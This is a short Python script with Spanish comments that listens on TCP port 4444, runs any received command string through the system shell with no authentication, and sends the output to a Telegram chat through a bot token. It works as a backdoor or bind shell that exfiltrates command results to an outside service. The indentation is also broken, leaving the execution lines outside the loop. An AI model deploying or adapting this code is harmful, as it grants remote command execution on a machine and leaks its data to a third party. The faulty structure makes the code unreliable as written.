#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import os
import telebot
TOKEN = "TOKEN" # Cambiar por el token
bot = telebot.TeleBot(TOKEN)
cid = "CID" # Cambiar por el numero cid
ip = "192.168.1.103"
puerto = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, puerto))
#s.bind(('', puerto))
s.listen(1)
while True:
        conn, addr = s.accept()
        cmd = conn.recv(1024)
print(" Comando: " + cmd)
out = os.popen(cmd).read()
if out != "":
        bot.send_message(cid, "Resultado: " + out)
else:
        bot.send_message(cid, "¡¡Comando sin salida!!")



